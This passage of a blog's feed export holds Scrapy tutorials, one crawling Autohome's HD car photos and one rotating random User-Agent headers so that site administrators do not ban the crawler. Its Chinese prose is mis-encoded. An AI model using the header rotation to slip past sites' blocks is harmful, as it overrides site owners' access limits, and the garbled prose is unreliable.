src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/PaAlqrv94KQEjJcS8pE9Ov8TGURzE3FpSa1PITEZSP4!/b/dDUBAAAAAAAA&amp;bo=nwbTAgAAAAADB2o!&amp;rf=viewer_4" alt="&quot;å¾—åˆ°å­—æ®µçš„å€¼&quot;"><br><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/urrusXE1LpcEWWYZj1zHZWhaCD1IEmv8VV5*QUTbyGU!/b/dDEBAAAAAAAA&amp;bo=OAQ8AgAAAAADFzA!&amp;rf=viewer_4" alt="&quot;å¾—åˆ°å­—æ®µçš„å€¼&quot;"></p>]]></content>
      
      
      <categories>
          
          <category> WEBå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> SQLMap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scrapyçˆ¬å–æ±½è½¦ä¹‹å®¶ç²¾é€‰é«˜æ¸…å¤§å›¾</title>
      <link href="/2019/02/19/scrapy-pa-qu-qi-che-zhi-jia-jing-xuan-gao-qing-da-tu/"/>
      <url>/2019/02/19/scrapy-pa-qu-qi-che-zhi-jia-jing-xuan-gao-qing-da-tu/</url>
      
        <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡å†™çˆ¬è™«,ä»Šå¤©ç®—æ˜¯å¤ä¹ ä¸‹Scrapy,æ­£æ‰€è°“æ¸©æ•…è€ŒçŸ¥æ–°.</p><p>è¿™æ¬¡çˆ¬å–çš„ç›®æ ‡ç½‘ç«™æ˜¯æ±½è½¦ä¹‹å®¶çš„ç²¾é€‰é«˜æ¸…å¤§å›¾.</p><p>å…ˆçœ‹çœ‹è¿è¡Œç»“æœå§</p><p><img src="http://b290.photo.store.qq.com/psb?/V10Lajvl04D7qQ/VWZf9yEkhXVMGAb0GRYfh6ZSTBi1ssJ.1XCqqsEMzts!/b/dCIBAAAAAAAA&amp;bo=EgLGAhICxgIBACc!&amp;rf=viewer_311" alt=""></p><p><img src="http://a2.qpic.cn/psb?/V10Lajvl04D7qQ/SMq7ob3LXMn4bNABWRoVq9slSJAAjmtakpj9jp*WO90!/b/dCEAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=2QKmA9kCpgMBACc!&amp;tl=1&amp;vuin=726301387&amp;tm=1550628000&amp;sce=50-1-1&amp;rf=viewer_311" alt=""></p><p><img src="http://a2.qpic.cn/psb?/V10Lajvl04D7qQ/u4oGnx1XvV9VA5H2YGNsXaeos2r86BdZImSXDwHNJWQ!/b/dC0AAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=UwXuA1MF7gMBACc!&amp;tl=1&amp;vuin=726301387&amp;tm=1550628000&amp;sce=50-1-1&amp;rf=viewer_311" alt=""></p><h1 id="é¡µé¢åˆ†æ"><a href="#é¡µé¢åˆ†æ" class="headerlink" title="é¡µé¢åˆ†æ"></a>é¡µé¢åˆ†æ</h1><p>ä¸‹é¢æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹å›¾ç‰‡ç²¾é€‰é¡µé¢</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/yhJteiFadlHCYQqOskFM.kLi0nGC9fpkdyOar5jeXjM!/b/dFQBAAAAAAAA&amp;bo=UAbdA1AG3QMDByI!&amp;rf=viewer_4" alt="1"></p><p>è¿™ä¸ªé¡µé¢ä¸­å…¨éƒ¨éƒ½æ˜¯å¥—å›¾,æˆ‘ä»¬æ‰“å¼€æŸä¸€å¥—å›¾è¿›è¡ŒæŸ¥çœ‹.</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/Zq4sxEk8g1LLNwycqoIhzG9bJyeVmILolNHr1O4Hm9g!/b/dLwAAAAAAAAA&amp;bo=aQdqA2kHagMDV3I!&amp;rf=viewer_4" alt="2"></p><p>ä¸€å¼€å§‹æˆ‘æƒ³ä»è¿™ä¸ªé¡µé¢è·å–é«˜æ¸…å¤§å›¾,æ— å¥ˆè¿™äº›é«˜æ¸…å¤§å›¾åœ¨é¡µé¢æºç ä¸­æ²¡æœ‰ğŸ˜”.</p><p>æœ€åå³ä¸Šè§’å‘ç°äº†ä¸€ä¸ª<strong>åˆ—è¡¨æ¨¡å¼</strong></p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/SWjcrhLWxpHeILbZfa8fXXbgBHr1eSCzc9pCYapvc1Y!/b/dDUBAAAAAAAA&amp;bo=3gbMA94GzAMDZ0I!&amp;rf=viewer_4" alt="åˆ—è¡¨"></p><p>åˆ—è¡¨æ¨¡å¼æ˜¾ç¤ºçš„éƒ½æ˜¯ä¸€äº›ç¼©ç•¥å›¾,é‚£ä¹ˆæ€ä¹ˆæŠŠç¼©ç•¥å›¾å˜æˆé«˜æ¸…å¤§å›¾å‘¢?</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/FI3Qyh2cBtgt1DbmEPc3E3L2TOm9fnwCVKQdqq6BsEA!/b/dL8AAAAAAAAA&amp;bo=agYpA2oGKQMDR2I!&amp;rf=viewer_4" alt=""></p><p>å¯ä»¥å°†ç¼©ç•¥å›¾URLé‡Œé¢çš„<strong>t_</strong>æ›¿æ¢æ‰,å°±ä¼šå‘ç°ç¼©ç•¥å›¾å°±å·²ç»å˜æˆäº†é«˜æ¸…å¤§å›¾</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/yq3h.sNU.emodpYFyMPh*HSRxrOwEUZK6WYqbRITvmA!/b/dL8AAAAAAAAA&amp;bo=jQXhA40F4QMDZ0I!&amp;rf=viewer_4" alt=""></p><h1 id="ä»£ç ç¼–å†™"><a href="#ä»£ç ç¼–å†™" class="headerlink" title="ä»£ç ç¼–å†™"></a>ä»£ç ç¼–å†™</h1><h2 id="çˆ¬è™«ç¼–å†™"><a href="#çˆ¬è™«ç¼–å†™" class="headerlink" title="çˆ¬è™«ç¼–å†™"></a>çˆ¬è™«ç¼–å†™</h2><p>æå–ç²¾é€‰å›¾ç‰‡é¡µé¢ä¸­çš„å¥—å›¾é“¾æ¥</p><pre><code>detail_urls = response.xpath(&quot;//ul[@class=&#39;content&#39;]/li/a/@href&quot;).getall()</code></pre><p>ç²¾é€‰å›¾ç‰‡é¡µé¢ä¸­ä¸‹ä¸€é¡µçš„å¤„ç†</p><pre><code>next_page = response.xpath(&quot;//div[@class=&#39;pageindex&#39;]/a[last()-1]/@href&quot;).get()        if next_page:            yield scrapy.Request(url=response.urljoin(next_page), callback=self.parse)</code></pre><p>ä»å¥—å›¾é¡µé¢ä¸­æå–<strong>åˆ—è¡¨æ¨¡å¼</strong>çš„é“¾æ¥</p><pre><code>list_pattern = response.xpath(&quot;//*[@id=&#39;cMode&#39;]/div/div[@class=&#39;side&#39;]/script&quot;).get()  # æå–åˆ—è¡¨æ¨¡å¼çš„URL        list_pattern = re.findall(&quot;/photolist/.*.html&quot;, list_pattern)[0]  # åŒ¹é…åˆ—è¡¨æ¨¡å¼çš„url</code></pre><p>ä»åˆ—è¡¨æ¨¡å¼ä¸­ä¸‹è½½é«˜æ¸…å¤§å›¾</p><pre><code>category = response.xpath(&quot;//div[@class=&#39;mini_left&#39;]/a[last()-1]/text()&quot;).get()image_urls = response.xpath(&quot;//ul[@id=&#39;imgList&#39;]/li/a/img/@src&quot;).getall()        image_urls = list(map(lambda x: x.replace(&quot;t_&quot;, &quot;&quot;), image_urls))  # å»é™¤urlä¸­çš„&quot;t_&quot;å¾—åˆ°é«˜æ¸…å¤§å›¾        image_urls = list(map(lambda x: response.urljoin(x), image_urls))        yield CarhomehdItem(category=category, image_urls=image_urls)</code></pre><h2 id="ç¼–å†™ItemPipelineä¿å­˜å›¾ç‰‡"><a href="#ç¼–å†™ItemPipelineä¿å­˜å›¾ç‰‡" class="headerlink" title="ç¼–å†™ItemPipelineä¿å­˜å›¾ç‰‡"></a>ç¼–å†™ItemPipelineä¿å­˜å›¾ç‰‡</h2><pre><code>class ImagePipeline(ImagesPipeline):    def get_media_requests(self, item, info):        request_objs = super(ImagePipeline, self).get_media_requests(item, info)        for request_obj in request_objs:            request_obj.item = item        return request_objs    def file_path(self, request, response=None, info=None):        path = super(ImagePipeline, self).file_path(request, response, info)        category = request.item.get(&quot;category&quot;)        image_store = IMAGES_STORE        category_path = os.path.join(image_store, category)        if not os.path.exists(category_path):            os.mkdir(category_path)        image_name = path.replace(&quot;full/&quot;, &quot;&quot;)        image_path = os.path.join(category_path, image_name)        return image_path</code></pre><p>å®Œæ•´ä»£ç :</p><p><a href="https://github.com/liu726301387/CarHomeHD" target="_blank" rel="noopener">https://github.com/liu726301387/CarHomeHD</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonçˆ¬è™« </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Scrapyè®¾ç½®éšæœºUserAgent</title>
      <link href="/2019/01/27/scrapy-she-zhi-sui-ji-qing-qiu-tou/"/>
      <url>/2019/01/27/scrapy-she-zhi-sui-ji-qing-qiu-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯UserAgent"><a href="#ä»€ä¹ˆæ˜¯UserAgent" class="headerlink" title="ä»€ä¹ˆæ˜¯UserAgent"></a>ä»€ä¹ˆæ˜¯UserAgent</h1><p>å½“æˆ‘ä»¬åœ¨è®¿é—®ç½‘é¡µçš„æ—¶å€™,æˆ‘ä»¬çš„æµè§ˆå™¨åœ¨å‘æœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ä¼šå‘é€ä¸€ä¸ªè¯·æ±‚å¤´å’Œä¸€ä¸ªè¯·æ±‚ä½“,è¯·æ±‚å¤´ä¸­åŒ…å«äº†å¾ˆå¤šé‡è¦çš„å­—æ®µå¸¸è§çš„å­—æ®µæœ‰<strong>User-Agent,Accept</strong>ç­‰,å…·ä½“çš„è¯·æ±‚å¤´çš„å†…å®¹è¯·å‚è€ƒ&lt;å›¾è§£HTTP&gt;.</p><h2 id="UserAgent"><a href="#UserAgent" class="headerlink" title="UserAgent"></a>UserAgent</h2><p>UserAgent:<strong>ç”¨æˆ·ä»£ç†</strong></p><p>æˆ‘ä»¬è¿™é‡Œåªå¯¹UserAgentåšä¸€ä¸ªä»‹ç»,UserAgentä¼šå°†åˆ›å»ºè¯·æ±‚çš„æµè§ˆå™¨å’Œç”¨æˆ·ä»£ç†åç§°ç­‰ä¿¡æ¯ä¼ ç»™æœåŠ¡å™¨.</p><p>Chromeçš„RequestHeader</p><pre><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cache-Control: max-age=0Connection: keep-aliveHost: fake-useragent.herokuapp.comUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</code></pre><p>Firefoxçš„RequestHeader</p><pre><code>Accept    text/html,application/xhtml+xmâ€¦plication/xml;q=0.9,*/*;q=0.8Accept-Encoding    gzip, deflate, brAccept-Language    zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cache-Control    max-age=0Connection    keep-aliveHost    fake-useragent.herokuapp.comUpgrade-Insecure-Requests    1User-Agent    Mozilla/5.0 (Windows NT 10.0; â€¦) Gecko/20100101 Firefox/66.0</code></pre><p>è¿™é‡Œæ˜¯ä¸€ä¸ªè¯·æ±‚å¤´,ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡º,æˆ‘ä»¬çš„User-Agentçš„å€¼ä¸º<strong>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</strong>,è¿™ä¸ªå€¼é‡Œé¢æœ‰å¾ˆå¤šä¿¡æ¯,å…¶ä¸­æœ€é‡è¦çš„å°±æ˜¯æˆ‘ä»¬çš„æµè§ˆå™¨ç‰ˆæœ¬ä¿¡æ¯.å¯ä»¥å‘ç°æˆ‘ä»¬ä½¿ç”¨Firefoxå’ŒChromeå…±åŒè®¿é—®ä¸€ä¸ªç½‘ç«™çš„æ—¶å€™,ä»–ä»¬çš„UserAgentæ˜¯ä¸ä¸€æ ·çš„.</p><h2 id="UserAgentå’Œçˆ¬è™«çš„å…³ç³»"><a href="#UserAgentå’Œçˆ¬è™«çš„å…³ç³»" class="headerlink" title="UserAgentå’Œçˆ¬è™«çš„å…³ç³»"></a>UserAgentå’Œçˆ¬è™«çš„å…³ç³»</h2><p>å½“æˆ‘ä»¬ä½¿ç”¨Scrapyå»å¯¹ç½‘ç«™é‡‘è¿›è¡ŒæŠ“å–çš„æ—¶å€™,<strong>Scrapyé»˜è®¤æœ‰ä¸€ä¸ªUserAgentå°±å«Scrapy</strong>,<strong>è¿™æ ·æˆ‘ä»¬ç›´æ¥å¯¹ç½‘ç«™è¿›è¡ŒæŠ“å–çš„æ—¶å€™å¾ˆå®¹æ˜“è¢«ç½‘ç«™ç®¡ç†å‘˜å°æ€æ‰.</strong></p><p>æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹Scrapyçš„æºç </p><pre><code>from scrapy import signalsclass UserAgentMiddleware(object):    &quot;&quot;&quot;This middleware allows spiders to override the user_agent&quot;&quot;&quot;    def __init__(self, user_agent=&#39;Scrapy&#39;):        self.user_agent = user_agent    @classmethod    def from_crawler(cls, crawler):        o = cls(crawler.settings[&#39;USER_AGENT&#39;])        crawler.signals.connect(o.spider_opened, signal=signals.spider_opened)        return o    def spider_opened(self, spider):        self.user_agent = getattr(spider, &#39;user_agent&#39;, self.user_agent)    def process_request(self, request, spider):        if self.user_agent:            request.headers.setdefault(b&#39;User-Agent&#39;, self.user_agent)</code></pre><p>Scrapyé»˜è®¤çš„UserAgent:<strong>user_agent=â€™Scrapyâ€™</strong></p><h1 id="Scrapyæ¶æ„"><a href="#Scrapyæ¶æ„" class="headerlink" title="Scrapyæ¶æ„"></a>Scrapyæ¶æ„</h1><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/1fF9t07Dc81TYlyEdQE0AzxhpTypecFxwoiZjxMq938!/b/dL4AAAAAAAAA&amp;bo=uQSBAwAAAAADBx0!&amp;rf=viewer_4" alt="Scrapyæ¶æ„å›¾"></p><p>æµç¨‹è§£æ:</p><ol><li>å¼•æ“ï¼šHiï¼Spider, ä½ è¦å¤„ç†å“ªä¸€ä¸ªç½‘ç«™ï¼Ÿ</li><li>Spiderï¼šè€å¤§è¦æˆ‘å¤„ç†xxxx.comã€‚</li><li>å¼•æ“ï¼šä½ æŠŠç¬¬ä¸€ä¸ªéœ€è¦å¤„ç†çš„URLç»™æˆ‘å§ã€‚</li><li>Spiderï¼šç»™ä½ ï¼Œç¬¬ä¸€ä¸ªURLæ˜¯xxxxxxx.comã€‚</li><li>å¼•æ“ï¼šHiï¼è°ƒåº¦å™¨ï¼Œæˆ‘è¿™æœ‰requestè¯·æ±‚ä½ å¸®æˆ‘æ’åºå…¥é˜Ÿä¸€ä¸‹ã€‚</li><li>è°ƒåº¦å™¨ï¼šå¥½çš„ï¼Œæ­£åœ¨å¤„ç†ä½ ç­‰ä¸€ä¸‹ã€‚</li><li>å¼•æ“ï¼šHiï¼è°ƒåº¦å™¨ï¼ŒæŠŠä½ å¤„ç†å¥½çš„requestè¯·æ±‚ç»™æˆ‘ã€‚</li><li>è°ƒåº¦å™¨ï¼šç»™ä½ ï¼Œè¿™æ˜¯æˆ‘å¤„ç†å¥½çš„request</li><li>å¼•æ“ï¼šHiï¼ä¸‹è½½å™¨ï¼Œä½ æŒ‰ç…§è€å¤§çš„ä¸‹è½½ä¸­é—´ä»¶çš„è®¾ç½®å¸®æˆ‘ä¸‹è½½ä¸€ä¸‹è¿™ä¸ªrequestè¯·æ±‚</li><li>ä¸‹è½½å™¨ï¼šå¥½çš„ï¼ç»™ä½ ï¼Œè¿™æ˜¯ä¸‹è½½å¥½çš„ä¸œè¥¿ã€‚ï¼ˆå¦‚æœå¤±è´¥ï¼šsorryï¼Œè¿™ä¸ªrequestä¸‹è½½å¤±è´¥äº†ã€‚ç„¶åå¼•æ“å‘Šè¯‰è°ƒåº¦å™¨ï¼Œè¿™ä¸ªrequestä¸‹è½½å¤±è´¥äº†ï¼Œä½ è®°å½•ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¾…ä¼šå„¿å†ä¸‹è½½ï¼‰</li><li>å¼•æ“ï¼šHiï¼Spiderï¼Œè¿™æ˜¯ä¸‹è½½å¥½çš„ä¸œè¥¿ï¼Œå¹¶ä¸”å·²ç»æŒ‰ç…§è€å¤§çš„ä¸‹è½½ä¸­é—´ä»¶å¤„ç†è¿‡äº†ï¼Œä½ è‡ªå·±å¤„ç†ä¸€ä¸‹ï¼ˆæ³¨æ„ï¼è¿™å„¿responsesé»˜è®¤æ˜¯äº¤ç»™def parse()è¿™ä¸ªå‡½æ•°å¤„ç†çš„ï¼‰ </li><li>Spiderï¼šï¼ˆå¤„ç†å®Œæ¯•æ•°æ®ä¹‹åå¯¹äºéœ€è¦è·Ÿè¿›çš„URLï¼‰ï¼ŒHiï¼å¼•æ“ï¼Œæˆ‘è¿™é‡Œæœ‰ä¸¤ä¸ªç»“æœï¼Œè¿™ä¸ªæ˜¯æˆ‘éœ€è¦è·Ÿè¿›çš„URLï¼Œè¿˜æœ‰è¿™ä¸ªæ˜¯æˆ‘è·å–åˆ°çš„Itemæ•°æ®ã€‚</li><li>å¼•æ“ï¼šHi ï¼ç®¡é“ æˆ‘è¿™å„¿æœ‰ä¸ªitemä½ å¸®æˆ‘å¤„ç†ä¸€ä¸‹ï¼è°ƒåº¦å™¨ï¼è¿™æ˜¯éœ€è¦è·Ÿè¿›URLä½ å¸®æˆ‘å¤„ç†ä¸‹ã€‚ç„¶åä»ç¬¬å››æ­¥å¼€å§‹å¾ªç¯ï¼Œç›´åˆ°è·å–å®Œè€å¤§éœ€è¦å…¨éƒ¨ä¿¡æ¯ã€‚</li><li>ç®¡é“<code></code>è°ƒåº¦å™¨ï¼šå¥½çš„ï¼Œç°åœ¨å°±åšï¼</li></ol><p>åœ¨è§£ææµç¨‹ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°,ä¸‹è½½ä¸­é—´ä»¶æ˜¯å¤„äºå¼•æ“(crawler.engine)å’Œä¸‹è½½å™¨(crawler.engine.download())ä¹‹é—´çš„ä¸€å±‚ç»„ä»¶ï¼Œå¯ä»¥æœ‰å¤šä¸ªä¸‹è½½ä¸­é—´ä»¶è¢«åŠ è½½è¿è¡Œã€‚</p><ol><li>å½“å¼•æ“ä¼ é€’è¯·æ±‚ç»™ä¸‹è½½å™¨çš„è¿‡ç¨‹ä¸­ï¼Œä¸‹è½½ä¸­é—´ä»¶å¯ä»¥å¯¹è¯·æ±‚è¿›è¡Œå¤„ç† ï¼ˆä¾‹å¦‚å¢åŠ http headerä¿¡æ¯ï¼Œå¢åŠ proxyä¿¡æ¯ç­‰ï¼‰ï¼›</li><li>åœ¨ä¸‹è½½å™¨å®Œæˆhttpè¯·æ±‚ï¼Œä¼ é€’å“åº”ç»™å¼•æ“çš„è¿‡ç¨‹ä¸­ï¼Œ ä¸‹è½½ä¸­é—´ä»¶å¯ä»¥å¯¹å“åº”è¿›è¡Œå¤„ç†ï¼ˆä¾‹å¦‚è¿›è¡Œgzipçš„è§£å‹ç­‰ï¼‰</li></ol><h1 id="è®¾ç½®ä¸‹è½½ä¸­é—´ä»¶"><a href="#è®¾ç½®ä¸‹è½½ä¸­é—´ä»¶" class="headerlink" title="è®¾ç½®ä¸‹è½½ä¸­é—´ä»¶"></a>è®¾ç½®ä¸‹è½½ä¸­é—´ä»¶</h1><h2 id="åŠ¨æ€è®¾ç½®User-Agentçš„ç¬¬ä¸€ç§æ–¹æ³•"><a href="#åŠ¨æ€è®¾ç½®User-Agentçš„ç¬¬ä¸€ç§æ–¹æ³•" class="headerlink" title="åŠ¨æ€è®¾ç½®User-Agentçš„ç¬¬ä¸€ç§æ–¹æ³•"></a>åŠ¨æ€è®¾ç½®User-Agentçš„ç¬¬ä¸€ç§æ–¹æ³•</h2><p>ä½¿ç”¨fake_useragentéšæœºæ›´æ¢user-agent</p><ol><li>å®‰è£…fake-useragent<ul><li>pip install fake-useragent</li></ul></li><li>å¯¼å…¥fake_useragent<ul><li>from fake_useragent import UserAgent </li></ul></li><li>å®ä¾‹åŒ–UserAgent<ul><li>self.ua = UserAgent()  # å®ä¾‹åŒ–useragent</li></ul></li></ol><p>ä¼˜ç‚¹:ä¸ç”¨è‡ªå·±ç»´æŠ¤UserAgent</p><p>ç¼ºç‚¹:å¯æ‰©å±•æ€§ä¸é«˜</p><p>æŸ¥çœ‹fake_userAgentçš„æºç å‘ç°è¿™ä¸ªç¬¬ä¸‰æ–¹åº“çš„æ¥å£æ¥è‡ªäº<a href="https://fake-useragent.herokuapp.com/browsers/0.1.4,**åé¢çš„ç‰ˆæœ¬å·ä¸ä¸€æ ·è·å–çš„éšæœºè¯·æ±‚å¤´çš„ç‰ˆæœ¬ä¹Ÿå°±ä¸ä¸€æ ·**æˆªè‡³ç°åœ¨æœ€æ–°çš„ç‰ˆæœ¬æ˜¯1.8" target="_blank" rel="noopener">https://fake-useragent.herokuapp.com/browsers/0.1.4,**åé¢çš„ç‰ˆæœ¬å·ä¸ä¸€æ ·è·å–çš„éšæœºè¯·æ±‚å¤´çš„ç‰ˆæœ¬ä¹Ÿå°±ä¸ä¸€æ ·**æˆªè‡³ç°åœ¨æœ€æ–°çš„ç‰ˆæœ¬æ˜¯1.8</a></p><p>åœ¨settingsä¸­è®¾ç½®é€‰æ‹©è·å–éšæœºè¯·æ±‚å¤´çš„ç±»å‹</p><pre><code>RANDOM_UA_TYPE = &quot;random&quot;       # è®¾ç½®userAgentçš„ç±»å‹</code></pre><p>ç¼–å†™Middleware</p><pre><code>class RandomUserAgent(object):    # ä½¿ç”¨fake_useragentéšæœºæ›´æ¢user-agent    def __init__(self, crawler):        super(RandomUserAgent, self).__init__()  # ç”¨çˆ¶ç±»çš„initæ–¹æ³•æ¥åˆå§‹åŒ–        # self.USER_AGENT = crawler.settings.get(&quot;USER_AGENT&quot;, [])        # è·å–settingså½“ä¸­çš„user_agent        self.ua = UserAgent()  # å®ä¾‹åŒ–useragent        self.ua_type = crawler.settings.get(&quot;RANDOM_UA_TYPE&quot;, &quot;random&quot;)  # å¯¼å…¥Uaçš„è·å–ç±»å‹,æ˜¯ieè¿˜æ˜¯è°·æ­Œç­‰    @classmethod    def from_crawler(cls, crawler):        return cls(crawler)    def process_request(self, request, spider):        def get_ua():  # åˆ©ç”¨é—­åŒ…å®Œæˆuaçš„å¯é…ç½®            return getattr(self.ua, self.ua_type)  # getattr:ä»å¯¹è±¡ä¸­è·å–å±æ€§        request.headers.setdefault(b&#39;User-Agent&#39;, get_ua())  # å°†éšæœºuseragentæ”¾åˆ°Requestçš„Headerä¸­</code></pre><h2 id="åŠ¨æ€è®¾ç½®User-Agentçš„ç¬¬äºŒç§æ–¹æ³•"><a href="#åŠ¨æ€è®¾ç½®User-Agentçš„ç¬¬äºŒç§æ–¹æ³•" class="headerlink" title="åŠ¨æ€è®¾ç½®User-Agentçš„ç¬¬äºŒç§æ–¹æ³•"></a>åŠ¨æ€è®¾ç½®User-Agentçš„ç¬¬äºŒç§æ–¹æ³•</h2><p>ä½¿ç”¨Randoméšæœºé€‰æ‹©è‡ªå·±å®šä¹‰å¥½çš„UserAgent</p><p>ä¼˜ç‚¹:å¯æ‰©å±•æ€§é«˜<br>ç¼ºç‚¹:ä¸å®¹æ˜“ç»´æŠ¤</p><pre><code>class UserAgentDownloadMiddleware(object):    # è¯·æ±‚å¤´åˆ—è¡¨    USER_AGENT = [        &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&quot;,        &quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36&quot;,        &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931&quot;,        &quot;Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393&quot;,        &quot;Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0&quot;,        &quot;Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0&quot;,        &quot;Mozilla/5.0 (Windows NT 6.2; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0&quot;,        &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0&quot;,        &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A&quot;,        &quot;Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25&quot;,        &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2&quot;,    ]    def process_request(self, request, spider):        # é‡å†™process_requestæ–¹æ³•ç»™æ¯ä¸ªrequestæ·»åŠ ä¸åŒçš„è¯·æ±‚å¤´        user_agent = random.choice(self.USER_AGENT)  # éšæœºé€‰æ‹©è¯·æ±‚å¤´        request.headers[&quot;User-Agent&quot;] = user_agent  # ç»™requestæ·»åŠ éšæœºè¯·æ±‚å¤´</code></pre><h2 id="åœ¨settingsä¸­å¼€å¯DownloadMiddleware"><a href="#åœ¨settingsä¸­å¼€å¯DownloadMiddleware" class="headerlink" title="åœ¨settingsä¸­å¼€å¯DownloadMiddleware"></a>åœ¨settingsä¸­å¼€å¯DownloadMiddleware</h2><pre><code>DOWNLOADER_MIDDLEWARES = {   # &#39;UserAgen_Demo.middlewares.UseragenDemoDownloaderMiddleware&#39;: 543,   #  &quot;UserAgen_Demo.middlewares.UserAgentDownloadMiddleware&quot;:543,        # éšæœºè¯·æ±‚å¤´    &quot;scrapy.downloadermiddlewares.useragent.UserAgentMiddleware&quot;:None,  # å°†é»˜è®¤çš„userAgentè®¾ç½®ä¸ºNone    &quot;UserAgen_Demo.middlewares.RandomUserAgent&quot;:200,}</code></pre><p><strong>åˆ‡è®°ä¸€å®šè¦å°†Scrapyçš„UserAgentè®¾ç½®ä¸ºNone</strong></p><h1 id="åˆ©ç”¨Http-binæŸ¥çœ‹è¯·æ±‚å¤´"><a href="#åˆ©ç”¨Http-binæŸ¥çœ‹è¯·æ±‚å¤´" class="headerlink" title="åˆ©ç”¨Http.binæŸ¥çœ‹è¯·æ±‚å¤´"></a>åˆ©ç”¨Http.binæŸ¥çœ‹è¯·æ±‚å¤´</h1><p>Spider</p><pre><code>class HttpbinSpider(scrapy.Spider):    name = &#39;HttpBin&#39;    allowed_domains = [&#39;httpbin.org&#39;]    start_urls = [&#39;https://httpbin.org/user-agent&#39;]    def parse(self, response):        user_agent = json.loads(response.text)[&quot;user-agent&quot;]        print(&#39;=&#39;*90)        print(user_agent)        print(&#39;=&#39; * 90)        yield scrapy.Request(self.start_urls[0], dont_filter=True)</code></pre><h1 id="è¿è¡Œç»“æœ"><a href="#è¿è¡Œç»“æœ" class="headerlink" title="è¿è¡Œç»“æœ"></a>è¿è¡Œç»“æœ</h1><p>fake_UserAgent</p><pre><code>2019-01-27 14:17:57 [scrapy.core.engine] INFO: Spider opened2019-01-27 14:17:57 [scrapy.extensions.logstats] INFO: Crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)2019-01-27 14:17:57 [scrapy.extensions.telnet] DEBUG: Telnet console listening on 127.0.0.1:60232019-01-27 14:17:58 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: None)==========================================================================================Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0==========================================================================================2019-01-27 14:17:59 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0==========================================================================================2019-01-27 14:17:59 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36==========================================================================================2019-01-27 14:18:01 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36==========================================================================================2019-01-27 14:18:02 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET https://httpbin.org/user-agent&gt; (referer: https://httpbin.org/user-agent)==========================================================================================Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) 